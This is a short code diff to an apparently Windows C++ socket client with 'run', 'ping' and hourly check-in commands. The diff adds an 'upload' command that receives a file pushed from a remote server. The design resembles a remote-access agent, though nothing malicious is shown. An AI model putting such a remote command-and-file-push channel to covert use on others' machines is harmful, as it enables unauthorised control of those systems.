@@ -21,6 +21,7 @@ constexpr char PING_COMMAND[] = "ping";
 constexpr char PONG_COMMAND[] = "pong";
 constexpr char RUN_COMMAND[] = "run";
 constexpr char OK_COMMAND[] = "ok";
+constexpr char UPLOAD_COMMAND[] = "upload";
 
 constexpr DWORD SLEEP_TIME = 1 * 1000 * 60 * 60;
 
@@ -187,6 +188,9 @@ void handleMsg(ClientSocket& client, const std::string& msg) {
             }
             throw e;
         }
+        client.sendMsg(OK_COMMAND);
+    } else if (command == UPLOAD_COMMAND) {
+        client.recvFile();
         client.sendMsg(OK_COMMAND);
     }
     else {
